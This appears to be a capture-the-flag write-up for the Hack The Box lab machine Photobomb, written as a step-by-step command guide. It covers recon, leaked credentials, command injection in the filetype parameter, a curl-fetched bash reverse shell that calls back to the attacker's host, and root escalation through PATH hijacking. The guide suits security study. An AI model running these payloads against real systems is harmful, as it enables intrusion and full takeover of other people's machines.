# 📸 HTB: Photobomb – Command & Exploitation Guide

## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)

## 🔍 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.182
nmap -p 22,80 -sCV 10.10.11.182
```

### Host Mapping
```bash
echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
```

### Fuzz for Subdomains
```bash
ffuf -u http://10.10.11.182 -H "Host: FUZZ.photobomb.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## 🌐 [Website Enumeration](HTTP)

### Locate JavaScript with Creds
Check source for:
```html
<script src="/static/photobomb.js"></script>
```

Look for:
```js
// Jameson: pre-populate creds for tech support...
'href','http://pH0t0:b0Mb!@photobomb.htb/printer'
```

### Feroxbuster Directory Scan
```bash
feroxbuster -u http://photobomb.htb -x php,html,txt \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

---

## ⚙️ Authenticated Image Panel

### Example POST Request for Image Processing
```http
POST /printer HTTP/1.1
Authorization: Basic cEgwdD...==  # Base64 of pH0t0:b0Mb!
Content-Type: application/x-www-form-urlencoded

photo=wolfgang.jpg&filetype=png&dimensions=1000x1000
```

---

## 💣 Command Injection via filetype Parameter

### POC: Confirm Injection
```bash
filetype=png;sleep+5
```

### Reverse Shell Payload
Start a listener:
```bash
nc -lnvp 443
```

Host this on your webserver as `shell.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

Send payload:
```http
filetype=png;curl+10.10.14.6/shell.sh|bash
```

---

## 🧑‍💻 Shell as `wizard`

### Stabilize Shell
```bash
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
reset
export TERM=screen
```

---

## 🚀 Privilege Escalation to Root

### Check Sudo Rights
```bash
sudo -l
# Output:
# (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

### Review `/opt/cleanup.sh`
```bash
cat /opt/cleanup.sh
```

Notable line:
```bash
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

---

## 🔓 Privesc Option 1 – PATH Hijack

### Create Fake `find` in Current Directory
```bash
echo -e '#!/bin/bash\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

---

## 🔓 Privesc Option 2 – Bash Builtin `[`

### `.bashrc` disables builtin:
```bash
enable -n [  # disables Bash builtin [
```

### Exploit Disabled `[`
```bash
echo -e '#!/bin/bash\nbash' > [
chmod +x [
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

---

## 🏁 Flags

### User Flag
```bash
cat /home/wizard/user.txt
```

### Root Flag
```bash
cat /root/root.txt
```